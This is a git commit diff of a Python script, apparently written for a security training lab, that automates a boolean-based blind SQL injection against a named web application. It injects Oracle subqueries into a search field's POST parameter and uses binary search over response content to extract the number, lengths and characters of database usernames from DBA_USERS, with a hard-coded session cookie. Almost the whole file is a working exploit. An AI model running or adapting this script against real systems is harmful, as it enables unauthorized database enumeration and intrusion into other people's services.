1a140ebf7e69ac515b0aa76118d7184b76b3d494
Gate36 <et9904@naver.com>
2024-03-14 01:21:02 +0900

    user명 추출 및 속도 최적화

--- main.py
+++ main.py
@@ -1,6 +1,5 @@
-import requests
-import random
-import time
+from requests import post
+from sys import exit
 
 ### VAL AREA
 targetURL = "http://elms1.skinfosec.co.kr:8082/community6/free"
@@ -8,9 +7,9 @@ targetString = "카카오"
 
 baseQuery = "aaaa%' and {} and 'a%'='a"
 
-userNameCount = "(SELECT COUNT(USERNAME) AS total_usernames FROM DBA_USERS) > {}"
-
-userNameData = "(SELECT * FROM DBA_USERS) > {}"
+userNameCount = "(SELECT COUNT(USERNAME) AS total_usernames FROM DBA_USERS) > "
+userNameIndex = "(SELECT length(USERNAME) FROM (SELECT USERNAME, rownum as rnum FROM DBA_USERS) WHERE rnum = {}) > "
+userNameData = "(SELECT ascii(substr(USERNAME, {}, 1)) FROM (SELECT USERNAME, rownum as rnum FROM DBA_USERS) WHERE rnum = {}) > "
 
 headers = {"Content-Type": "application/x-www-form-urlencoded"}
 cookies = {"JSESSIONID": "8623A875E3EA6CF5471045FFA0614F6F"}
@@ -24,40 +23,48 @@ data = {
 
 ### FUNCTION AREA
 def check_query(query, mid):
-    # FIX THIS LATER
-    return query > mid
+    completeQuery = query + str(mid)
+    data["keyword"] = baseQuery.format(completeQuery)
+    r = post(targetURL, headers=headers, cookies=cookies, data=data)
+
+    if targetString in r.text:
+        return True
+    else:
+        return False
 
 
 def binary_search(low, high, query):
-    if low <= high:
+    result = None  # 조건을 만족하는 최소 mid 값을 저장할 변수
+    while low <= high:
         mid = (low + high) // 2
         if check_query(query, mid):
-            # 쿼리 응답이 탐색값 초과(>)
-            return binary_search(mid + 1, high, query)
+            # query is over mid
+            low = mid + 1
         else:
-            # 쿼리 응답이 탐색값 이하(=<)
-            result = binary_search(low, mid - 1, query)
-            # 탐색 값이 없을 시 mid 반환
-            return mid if result is None else result
-    else:
-        # 범위 벗어남
-        return None
+            # mid found, narrow down searching
+            result = mid
+            high = mid - 1
+    return result
 
-
-"""
-while True:
-
-
-    data["keyword"] = baseQuery.format(userNameCount)
-    r = requests.post(targetURL, headers=headers, cookies=cookies, data=data)
-
-    if targetString in r.text:
-        print("success!")
-
-    time.sleep(10)
-"""
 
 if __name__ == "__main__":
-    result = binary_search(0, 100, 35)
+    result = {}
+    NameCountMAX = binary_search(0, 100, userNameCount)
+    print(f"{NameCountMAX} names here")
+
+    for NameCount in range(1, NameCountMAX + 1):
+        name = ""
+        NameIndexMAX = binary_search(1, 30, userNameIndex.format(NameCount))
+        print(f"{NameCount} user name: {NameIndexMAX} characters")
+
+        for NameIndex in range(1, NameIndexMAX + 1):
+            nameChr = chr(
+                binary_search(32, 126, userNameData.format(NameIndex, NameCount))
+            )
+            print(nameChr)
+            name = name + nameChr
+
+        result[str(NameCount)] = name
+        print(f"{NameCount}:{name} Done.")
 
     print(result)
